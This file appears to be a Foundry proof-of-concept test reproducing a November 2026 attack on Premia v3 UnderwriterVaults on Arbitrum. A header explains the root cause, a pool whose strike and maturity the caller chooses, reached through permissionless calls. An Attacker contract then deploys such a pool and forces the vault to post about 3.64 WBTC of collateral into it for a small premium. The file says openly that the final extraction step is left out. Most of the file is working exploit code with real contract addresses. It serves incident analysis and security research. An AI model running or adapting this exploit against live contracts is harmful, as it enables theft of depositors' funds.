// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Premia UnderwriterVault forced-underwriting primitive PoC (Arbitrum, 2026-11-01)
//
// This test reproduces the forced-underwriting PRIMITIVE and its magnitude. It does NOT reproduce a
// realized loss. Nothing here drains the reported campaign total in-test; see Reconstruction.
//
// @Incident
// Premia v3 (Blue) UnderwriterVaults on Arbitrum were attacked on 2026-11-01. Reported figure across
// the campaign is ~400.5K USD (reported, not reproduced here). Addresses:
//   Attacker EOA     : https://arbiscan.io/address/0xbeBa8CEfD0D75d747C5AD966Dc17C0Bb60D84dBd
//   Attacker contract: https://arbiscan.io/address/0x577168C8c6fA937495C3D6961f1d7D734b2d785f
//   Victim vault A   : https://arbiscan.io/address/0x45dF5EA836A15B561937Ae8373ab9eE984aea531 (Short Vol WBTC/USDCe-C)
//   Drain tx 1 of 2  : https://arbiscan.io/tx/0x64602cbbeba5d3c7a5e2cff4f98cc118886fc6051c56fa50458abec2c90441ac
//   Drain tx 2 of 2  : https://arbiscan.io/tx/0xd7e8086df0570c5389ca27eb9bcdff290e810c094155b410a42e5bad2b3244ff
//
// @Root cause
// The vault resolves the pool it underwrites with _getPoolAddress, which fixes base, quote and
// oracleAdapter to the vault's own market but takes strike and maturity from the caller, so a pool
// an attacker deploys for that market with a chosen strike/maturity is accepted. deployPool is
// permissionless (external nonReentrant). UnderwriterVault.trade is permissionless too (external
// nonReentrant, no role). A buy makes the vault writeFrom that pool: it posts the position's full
// collateral(size, strike) as the short underwriter and hands the caller the long, charging only a
// tiny Black-Scholes premium. Every step is callable by a fresh EOA with no privileged role.
//
// @Reconstruction
// Fork block 520166284 (one block before the first drain tx). Typed interface calls on the real
// verified Premia contracts, no mocks, no vm.store, no vm.prank. A single permissionless
// vault.trade(buy 3.75) routes 3.6441 WBTC (97% of vault A's balance) out of the vault into an
// attacker-deployed pool and mints the attacker the matching 3.75-contract long, for a ~0.117 WBTC
// premium.
//
// The extraction leg is NOT reproduced here: the attacker netting the routed collateral out (on
// chain a 4.4904 WBTC pool -> attacker net settlement on pool A) is driven by a cross-transaction
// market-price walk (0.0001 -> 0.098 built with wash trades across the attacker's four txs) and by
// Premia's per-position withdrawal delay having elapsed on LP positions seeded in an earlier tx.
// Reproducing that price walk needs trace-level call data (per-op amounts, directions and tick
// hints) that was not available at build time. Absent the extraction leg the routed collateral
// returns to the vault at settlement, so this test asserts only the measured forced-underwriting
// primitive, not a realized drain.
//
// @Result
// Asserts the vault collateral routed out by one permissionless trade is ~3.6441 WBTC (within 1% of
// the on-chain figure) and that the attacker received the matching 3.75 long. The extraction leg
// described above is the remaining step to a realized loss.
//
// @Run
// forge test --contracts src/test/2026-11/Premia_exp.sol --evm-version cancun -vvv

interface IPoolFactory {
    struct PoolKey {
        address base;
        address quote;
        address oracleAdapter;
        uint256 strike;
        uint256 maturity;
        bool isCallPool;
    }
    function deployPool(PoolKey calldata k) external payable returns (address poolAddress);
    function getPoolAddress(PoolKey calldata k) external view returns (address pool, bool isDeployed);
}

interface IVault {
    function trade(IPoolFactory.PoolKey calldata poolKey, uint256 size, bool isBuy, uint256 premiumLimit, address referrer) external;
}

interface IPremiaPool {
    struct Key {
        address owner;
        address operator;
        uint256 lower;
        uint256 upper;
        uint8 orderType;
    }
    struct Delta {
        int256 collateral;
        int256 longs;
        int256 shorts;
    }
    function deposit(Key calldata p, uint256 belowLower, uint256 belowUpper, uint256 size, uint256 minMarketPrice, uint256 maxMarketPrice) external returns (Delta memory);
    function getNearestTicksBelow(uint256 lower, uint256 upper) external view returns (uint256 nearestBelowLower, uint256 nearestBelowUpper);
    function marketPrice() external view returns (uint256);
    function balanceOf(address account, uint256 tokenId) external view returns (uint256);
}

contract Premia_exp is Test {
    IPoolFactory constant FACTORY = IPoolFactory(0xAE4fB6622F25f397587F11638dA8CE88C27b5645);
    IERC20 constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IVault constant VAULT_WBTC = IVault(0x45dF5EA836A15B561937Ae8373ab9eE984aea531);

    // Premia LONG token id (ERC1155), PoolStorage.LONG = 1
    uint256 constant LONG = 1;

    Attacker atk;

    function setUp() public {
        vm.createSelectFork("arbitrum", 520166284); // one block before the first exploit tx
        atk = new Attacker();
        // The entry leg needs only the small BS premium as working capital (the vault supplies the
        // collateral). The live attack additionally took a Balancer flash loan (0.9 WBTC) to fund
        // the LP wash-trading of the extraction leg, which this PoC does not reproduce - see header.
        deal(address(WBTC), address(atk), 0.2e8);
    }

    function testExploit() public {
        uint256 vaultBefore = WBTC.balanceOf(address(VAULT_WBTC));
        emit log_named_decimal_uint("Vault WBTC balance (pre)", vaultBefore, 8);

        atk.run();

        uint256 vaultAfter = WBTC.balanceOf(address(VAULT_WBTC));
        uint256 routedOut = vaultBefore - vaultAfter;
        uint256 attackerLong = IPremiaPool(atk.pool()).balanceOf(address(atk), LONG);

        emit log_named_decimal_uint("Vault WBTC balance (post)", vaultAfter, 8);
        emit log_named_decimal_uint("Vault WBTC collateral routed out by one permissionless trade", routedOut, 8);
        emit log_named_decimal_uint("Attacker long contracts received (18dp)", attackerLong, 18);

        // On-chain the first drain tx moved 3.6441 WBTC of this vault's collateral. Assert the
        // reproduced routing is within 1% of that measured figure, and that the attacker got the
        // matching 3.75 long for it.
        assertApproxEqRel(routedOut, 3.6441e8, 0.01e18, "vault collateral not routed out as measured");
        assertEq(attackerLong, 3.75e18, "attacker did not receive the matching long");
    }
}

contract Attacker {
    IPoolFactory constant FACTORY = IPoolFactory(0xAE4fB6622F25f397587F11638dA8CE88C27b5645);
    address constant ROUTER = 0xDEfBBAc44F2088a70b648E1231b2cA9683774c48;
    IERC20 constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 constant USDCe = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    address constant ORACLE = 0x68BDA63662b16550e86Ad16160625eb293AC3d5F;
    uint256 constant MATURITY = 1793952000;
    IVault constant VAULT_WBTC = IVault(0x45dF5EA836A15B561937Ae8373ab9eE984aea531);
    uint256 constant UNIT = 1e18;

    IPremiaPool public pool;

    function _key() internal pure returns (IPoolFactory.PoolKey memory) {
        return IPoolFactory.PoolKey({base: address(WBTC), quote: address(USDCe), oracleAdapter: ORACLE, strike: 78000e18, maturity: MATURITY, isCallPool: true});
    }

    function run() external {
        IPoolFactory.PoolKey memory k = _key();

        // (1) permissionless pool deployment for the vault's exact market
        pool = IPremiaPool(FACTORY.deployPool(k));
        WBTC.approve(ROUTER, type(uint256).max);
        WBTC.approve(address(VAULT_WBTC), type(uint256).max); // vault pulls the premium directly

        // seed a bottom-tick LC order so the pool has a market price
        _dep(0.001e18, 0.002e18, 0.0001e18);

        // (2) permissionless option buy -> vault.writeFrom() posts full collateral into our pool
        uint256 vb = WBTC.balanceOf(address(VAULT_WBTC));
        VAULT_WBTC.trade(k, 3.75e18, true, 1e18, address(0)); // premiumLimit kept below fromTokenDecimals overflow
        console.log("vault WBTC routed into attacker pool (sats):", vb - WBTC.balanceOf(address(VAULT_WBTC)));
    }

    function _dep(uint256 lower, uint256 upper, uint256 size) internal {
        (uint256 bl, uint256 bu) = pool.getNearestTicksBelow(lower, upper);
        IPremiaPool.Key memory p = IPremiaPool.Key({owner: address(this), operator: address(this), lower: lower, upper: upper, orderType: 2});
        pool.deposit(p, bl, bu, size, 0, UNIT);
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return 0xf23a6e61;
    }
    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata) external pure returns (bytes4) {
        return 0xbc197c81;
    }
}
